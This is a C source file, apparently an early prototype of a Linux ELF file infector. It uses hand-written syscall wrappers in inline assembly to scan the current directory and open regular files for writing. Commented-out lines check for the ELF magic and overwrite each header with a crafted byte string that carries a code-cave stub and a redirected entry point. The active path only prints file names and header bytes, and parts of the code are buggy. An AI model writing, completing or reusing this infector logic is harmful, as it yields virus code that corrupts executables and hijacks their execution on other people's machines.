
// ----------------------------------------------------------------------------
// "THE BEER-WARE LICENSE" (Revision 43):
// <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
// can do whatever you want with this stuff. If we meet some day, and you think
// this stuff is worth it, you can buy me a beer in return Aaron R. Yool
// ----------------------------------------------------------------------------

#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>

#include <stddef.h>
#include <stdio.h>
#include <stdint.h>

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)


typedef struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	 offsetof(struct linux_dirent, d_name) */
	/*
	char           pad;       // Zero padding byte
	char           d_type;    // File type (only since Linux 2.6.4;
	// offset is (d_reclen - 1))
	*/
} dent;

print_dent_offsets()
{
	printf("ino: %i\n", offsetof(dent, d_ino));
	printf("off: %i\n", offsetof(dent, d_off));
	printf("reclen: %i\n", offsetof(dent, d_reclen));
	printf("name: %i\n", offsetof(dent, d_name));
}

int Mopen(const char* str, uint64_t flags, uint64_t perm)
{
	int fd;
	asm(
		"xor rax, rax\n"
		"mov al, 2\n"
		"mov rdi, %1\n"
		"mov rsi, %2\n"
		"mov rdx, %3\n"
		"syscall\n"
	:"+a"(fd) : "r"(str), "r"(flags), "r"(perm) );
	return fd;
}

uint64_t Mread(uint64_t fd, void* buf, uint64_t size)
{
	uint64_t ret;
	asm(
		"xor rax, rax\n"
		"mov rdi, %1\n"
		"lea rsi, [%2]\n"
		"mov rdx, %3\n"
		"syscall\n"
	:"+a"(ret) : "r"(fd), "r"(buf), "r"(size) );
	return ret;
}

Mclose(uint64_t fd)
{
	asm(
		"xor rax, rax\n"
		"mov al, 3\n"
		"mov rdi, r8\n"
		"syscall\n"
	: : "r"(fd) );
	return;
}

uint64_t Mlseek(uint64_t fd, uint64_t offset, uint64_t whence)
{
	uint64_t ret;
	asm(
		"xor rax, rax\n"
		"mov al, 8\n"
		"mov rdi, %1\n"
		"mov rsi, %2\n"
		"mov rdx, %3\n"
		"syscall\n"
	: "+a"(ret) : "r"(fd), "r"(offset), "r"(whence) );
	return ret;
}

int Mopendir(const char* dirstr)
{
	return Mopen(dirstr, 0x10000, 0);
}

void* Mmalloc(uint64_t size)
{
	void* ptr;
	asm(
		"xor rax, rax\n"	//; char* buf=(char*)sbrk(1024);
		"mov al, 12\n"
		"xor rdi, rdi\n"	//; 		//end=brk(0) <- get the current end value
		"syscall\n"
		"lea r9, [rax]\n"
		
		"xor rax, rax\n"
		"mov al, 12\n"
		"add r9, %1\n"
		"mov rdi, r9\n"		//; 		//brk(end+1024) <- allocate memory
		"syscall\n"
		:"+a"(ptr) : "r"(size)
	);
	return ptr;
}

Mgetdents(uint64_t fd, void* buf, uint64_t size)
{
	int nread;
	asm(
		"xor rax, rax\n"	//; 	nread = syscall(SYS_getdents, fd, buf, sizeof(buf));
		"mov al, 78\n"
		"mov rdi, %1\n"
		"mov rsi, %2\n"
		"mov rdx, %3\n"
		"syscall\n"
		:"+a"(nread) :"r"(fd), "r"(buf),  "r"(size)
	);
	return nread;
}


//	elf_header:                                      ; Elf32_elf_header
//	db 0x7F,"ELF" ;   e_ident  >>>
//	times 12 - (cave_end - cave_start) db 'A'	; we need bytes for padding, the code cave here is 12 bytes long
//	; e_ident <<<
//	dw 2                               ;   e_type
//	dw 62                              ;   e_machine
//	dd 1                               ;   e_version
//	dq _start                          ;   e_entry
//	dq program_header - $$             ;   e_phoff
//	dq 0                               ;   e_shoff
//	dd 0                               ;   e_flags
//	dw elf_headersize                  ;   e_ehsize
//	dw program_headersize              ;   e_phentsize
//	dw 1                               ;   e_phnum
//	dw 0                               ;   e_shentsize
//	dw 0                               ;   e_shnum
//	dw 0                               ;   e_shstrndx
	char* poop1=\
				"\x7f"	// MAGIC ->
				"ELF"	// ...
				"\xe8\x37\x00\x00\x00\xc3\xFF\xFF\xFF\xFF\xFF\xFF" // ... 16
				"\x02\x00"		// e_type	 18
				"\x3e\x00"		// e_machine 20
				"\x01\x00\x00\x00" // e_version	24
				"\x4a\x81\x04\x08\x00\x00\x00\x00"; // e_entry 32 Entry point address: 0x804814a

main()
{
	printf("%i\n", SEEK_SET);
}

_main()
{
	uint64_t fd, nread, f;
	// opendir
	fd = Mopendir(".");
	if (fd == -1)
		handle_error("open");
	
	char* buf = Mmalloc(1032);
	char* fbuf = buf+1024;
	
	// list dir
	nread = Mgetdents(fd, buf, 1024);
	if (nread == -1)
		handle_error("getdents");

	uint64_t bpos = 0;
	do
	{
		dent* d;//= (struct linux_dirent *) (buf + bpos);
		asm("lea %0, [%1+%2]" :"=r"(d) : "r"(buf), "r"(bpos));

		uint64_t d_type = *(buf + bpos + d->d_reclen - 1);
		
		if(d_type == DT_REG)
		{
			f = Mopen(d->d_name, 2, 0);
//			Mread(f, fbuf, 4);
			
//			if(fbuf[0]==0x7f&&fbuf[1]=='E'&&fbuf[2]=='L'&&fbuf[3]=='F')
//			{
				printf("%s\n", d->d_name);
//				Mlseek(f, 0, 0);
//				write(f, poop1, 24);	// write up to entry point
//				Mread(f, fbuf, 8);
//				write(f, fbuf, 8);	// write up to entry point
				
				lseek(f, 24, 0);
				read(f, fbuf, 8);
				printf("%s",fbuf);
				close(f);
//			}
		}
		
		bpos += d->d_reclen;
	} while(bpos < nread);
	// closedir
	close(fd);
}










